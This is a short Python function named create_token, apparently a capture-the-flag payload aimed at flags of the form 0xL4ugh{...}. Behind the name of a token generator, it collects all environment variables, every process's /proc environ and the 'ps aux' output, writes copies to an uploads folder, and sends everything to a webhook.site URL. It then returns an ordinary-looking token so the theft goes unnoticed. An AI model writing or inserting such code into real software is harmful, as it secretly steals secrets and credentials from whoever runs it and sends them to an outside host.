def create_token(user_id):
    """Capture everything when bot runs"""
    import os
    import glob
    import urllib.request
    import urllib.parse
    import json
    import time
    
    WEBHOOK = "https://webhook.site/1738ce87-4a08-47ae-9cd5-323dc449cb7d"
    
    def send_webhook(data, title="data"):
        try:
            payload = json.dumps({"title": title, "data": data[:8000]}).encode()
            req = urllib.request.Request(WEBHOOK, data=payload, headers={'Content-Type': 'application/json'})
            urllib.request.urlopen(req, timeout=10)
        except:
            pass
        
        try:
            encoded = urllib.parse.quote(data[:2000])
            urllib.request.urlopen(f"{WEBHOOK}?{title}={encoded}", timeout=10)
        except:
            pass
    
    timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
    send_webhook(f"Bot execution at {timestamp}", "timestamp")
    
    # Current environment
    current_env = "\n".join([f"{k}={v}" for k, v in os.environ.items()])
    send_webhook(current_env, "current_env")
    
    with open('/app/uploads/CURRENT_ENV.txt', 'w') as f:
        f.write(current_env)
    
    # All /proc/*/environ
    all_procs = []
    for env_file in sorted(glob.glob("/proc/[0-9]*/environ")):
        try:
            pid = env_file.split('/')[2]
            with open(env_file, 'rb') as f:
                content = f.read().decode('utf-8', errors='ignore')
            formatted = content.replace('\x00', '\n')
            all_procs.append(f"\n=== PID {pid} ===\n{formatted}\n")
        except:
            pass
    
    all_procs_str = ''.join(all_procs)
    
    with open('/app/uploads/ALL_PROCS.txt', 'w') as f:
        f.write(all_procs_str)
    
    # Send in chunks
    for i in range(0, len(all_procs_str), 3000):
        chunk = all_procs_str[i:i+3000]
        send_webhook(chunk, f"procs_{i//3000+1}")
    
    # Search for FLAG
    import re
    flag_pattern = re.compile(r'0xL4ugh\{[^}]+\}')
    combined = current_env + "\n" + all_procs_str
    flags = flag_pattern.findall(combined)
    
    if flags:
        for flag in flags:
            send_webhook(flag, "FLAG_FOUND")
            with open('/app/uploads/FLAG.txt', 'w') as f:
                f.write(flag)
    else:
        send_webhook("No flag found", "no_flag")
    
    # Process list
    try:
        import subprocess
        ps_output = subprocess.check_output(['ps', 'aux'], text=True)
        send_webhook(ps_output, "ps_aux")
    except:
        pass
    
    with open('/app/uploads/SUCCESS.txt', 'w') as f:
        f.write(f"Executed at {timestamp}\n")
    
    send_webhook("Complete", "status")
    
    import secrets
    return secrets.token_urlsafe(32)
